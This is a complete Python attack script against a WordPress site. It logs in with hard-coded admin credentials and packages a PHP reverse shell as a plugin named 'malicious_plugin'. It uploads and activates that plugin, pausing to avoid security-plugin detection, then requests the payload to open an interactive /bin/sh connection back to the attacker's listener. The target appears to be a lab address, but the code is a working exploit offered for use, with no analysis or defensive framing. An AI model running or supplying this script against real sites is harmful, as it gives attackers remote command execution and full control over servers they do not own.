import requests
import sys
import time
import zipfile
import io
import re
import urllib.parse
from bs4 import BeautifulSoup

# Configuration
TARGET_URL = "http://172.20.0.50"  # Base URL of the WordPress site
USERNAME = "webmaster"
PASSWORD = "P@ssw0rd"
LHOST = "192.168.125.100"  # Your local IP
LPORT = "4444"  # Port for the reverse shell

# PHP reverse shell payload
PHP_PAYLOAD = f"""<?php
set_time_limit(0);
$ip = '{LHOST}';
$port = {LPORT};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {{
    $pid = pcntl_fork();
    if ($pid == -1) {{
        exit(1);
    }}
    if ($pid) {{
        exit(0);
    }}
    if (posix_setsid() == -1) {{
        exit(1);
    }}
    $daemon = 1;
}}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{
    exit(1);
}}

$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {{
    exit(1);
}}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (1) {{
    if (feof($sock)) {{
        break;
    }}
    if (feof($pipes[1])) {{
        break;
    }}

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {{
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }}

    if (in_array($pipes[1], $read_a)) {{
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }}

    if (in_array($pipes[2], $read_a)) {{
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }}
}}

fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
fclose($sock);
proc_close($process);
?>
"""

def create_malicious_plugin():
    plugin_name = "malicious_plugin"
    payload_name = "payload"
    plugin_dir = f"{plugin_name}"

    # Plugin header file
    plugin_script = f"""<?php
/**
 * Plugin Name: {plugin_name}
 * Version: 1.0.0
 * Author: Attacker
 * Author URI: http://example.com
 * License: GPL2
 */
?>
"""
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_STORED) as zip_file:
        zip_file.writestr(f"{plugin_dir}/{plugin_name}.php", plugin_script)
        zip_file.writestr(f"{plugin_dir}/{payload_name}.php", PHP_PAYLOAD)
    zip_buffer.seek(0)
    return zip_buffer, f"{plugin_name}.zip", plugin_name, payload_name

def login(session, target_url, username, password):
    login_url = f"{target_url}/wp-login.php"
    data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": f"{target_url}/wp-admin/",
        "testcookie": "1"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36"
    }
    session.cookies.set("lp_session_guest", "g-6811d91632d00")
    session.cookies.set("wordpress_test_cookie", "WP Cookie check")

    print(f"[*] Attempting login with {username}:{password} at {login_url}")
    response = session.post(login_url, data=data, headers=headers, allow_redirects=True)
    
    if "wp-admin" in response.url and "login" not in response.url:
        print("[+] Login successful!")
        print(f"[*] Cookies: {session.cookies.get_dict()}")
        return True
    
    if "reauth=1" in response.url:
        print("[-] Login failed: Re-authentication required. Session might have been invalidated.")
    elif "wp-login.php" in response.url:
        print("[-] Login failed: Still on login page.")
    else:
        print("[-] Login failed: Unexpected redirect.")
    print(f"Response URL: {response.url}")
    print(f"Response: {response.text[:500]}...")
    return False

def upload_plugin(session, target_url, zip_file, zip_filename):
    # Step 1: Access the plugin upload page to get the form
    upload_page_url = f"{target_url}/wp-admin/plugin-install.php?tab=upload"
    print(f"[*] Accessing plugin upload page: {upload_page_url}")
    response = session.get(upload_page_url)
    
    if "wp-login.php" in response.url:
        print("[-] Session invalid: Redirected to login page.")
        return False
    
    # Parse the form to extract fields
    soup = BeautifulSoup(response.text, 'html.parser')
    form = soup.find('form', {'id': 'plugin-upload-form'}) or soup.find('form', {'enctype': 'multipart/form-data'})
    if not form:
        print("[-] Failed to find plugin upload form.")
        print(f"Response: {response.text[:500]}...")
        return False

    # Extract form action and handle full vs relative URL
    form_action = form.get('action') or "/wp-admin/update.php?action=upload-plugin"
    if form_action.startswith('http://') or form_action.startswith('https://'):
        upload_url = form_action
    else:
        upload_url = f"{target_url.rstrip('/')}{form_action}"
    print(f"[*] Form action URL: {upload_url}")

    # Extract form fields
    data = {}
    for input_field in form.find_all('input'):
        name = input_field.get('name')
        value = input_field.get('value')
        if name and value and name != "pluginzip":
            data[name] = value
    print(f"[*] Extracted form fields: {data}")

    # Override specific fields
    data["_wp_http_referer"] = upload_page_url
    data["install-plugin-submit"] = "Install Now"

    # Extract nonce explicitly if not in form fields
    nonce = data.get("_wpnonce")
    if not nonce:
        nonce_match = re.search(r'name="_wpnonce"\s+value="([a-f0-9]+)"', response.text)
        if nonce_match:
            nonce = nonce_match.group(1)
            data["_wpnonce"] = nonce
        else:
            print("[-] Failed to extract _wpnonce for plugin upload.")
            return False
    print(f"[*] Using _wpnonce: {nonce}")

    # Add a delay to avoid security plugin triggers
    time.sleep(3)

    # Prepare the file upload
    files = {
        "pluginzip": (zip_filename, zip_file, "application/zip")
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36"
    }
    print(f"[*] Uploading plugin to: {upload_url}")
    response = session.post(upload_url, files=files, data=data, headers=headers, allow_redirects=True)
    
    # Check for success or errors
    soup = BeautifulSoup(response.text, 'html.parser')
    error_div = soup.find('div', {'class': 'error'}) or soup.find('div', {'class': 'notice-error'})
    if error_div:
        print(f"[-] Plugin upload failed with error: {error_div.text.strip()}")
        return False
    
    if "Plugin installed successfully" in response.text:
        print("[+] Malicious plugin uploaded successfully!")
        return True
    
    print("[-] Plugin upload failed.")
    print(f"Response URL: {response.url}")
    print(f"Response: {response.text[:1000]}...")
    return False

def activate_plugin(session, target_url, plugin_name):
    plugins_url = f"{target_url}/wp-admin/plugins.php"
    print(f"[*] Accessing plugins page: {plugins_url}")
    response = session.get(plugins_url)
    
    if "wp-login.php" in response.url:
        print("[-] Session invalid: Redirected to login page.")
        return False
    
    nonce_match = re.search(r'name="_wpnonce"\s+value="([a-f0-9]+)"', response.text)
    if not nonce_match:
        print("[-] Failed to extract _wpnonce for plugin activation.")
        return False
    nonce = nonce_match.group(1)
    print(f"[*] Extracted _wpnonce: {nonce}")

    time.sleep(3)

    plugin_path = urllib.parse.quote(f"{plugin_name}/{plugin_name}.php")
    activate_url = f"{plugins_url}?action=activate&plugin={plugin_path}&_wpnonce={nonce}"
    print(f"[*] Activating plugin: {activate_url}")
    response = session.post(activate_url, allow_redirects=True)
    
    if "Plugin activated" in response.text:
        print("[+] Malicious plugin activated!")
        return True
    print("[-] Plugin activation failed.")
    print(f"Response: {response.text[:500]}...")
    return False

def trigger_shell(target_url, plugin_name, payload_name):
    shell_url = f"{target_url}/wp-content/plugins/{plugin_name}/{payload_name}.php"
    print(f"[*] Triggering shell by sending GET request to: {shell_url}")
    try:
        # Use a very short timeout since we don't expect a response
        requests.get(shell_url, timeout=1)
        print("[+] GET request sent to trigger the shell! Check your Netcat listener.")
    except requests.exceptions.Timeout:
        print("[+] GET request sent to trigger the shell! (Timed out as expected, check your Netcat listener.)")
    except requests.exceptions.RequestException as e:
        print(f"[*] Failed to send GET request to trigger shell: {e}")
        print("[*] The shell might still have triggered; check your Netcat listener.")

def main():
    if LHOST == "your_local_ip":
        print("[-] Please set LHOST to your local IP (e.g., 192.168.125.100).")
        sys.exit(1)

    session = requests.Session()

    if not login(session, TARGET_URL, USERNAME, PASSWORD):
        sys.exit(1)

    zip_file, zip_filename, plugin_name, payload_name = create_malicious_plugin()
    if not upload_plugin(session, TARGET_URL, zip_file, zip_filename):
        sys.exit(1)

    if not activate_plugin(session, TARGET_URL, plugin_name):
        print("[*] Activation failed, but attempting to trigger shell anyway...")

    trigger_shell(TARGET_URL, plugin_name, payload_name)

if __name__ == "__main__":
    main()
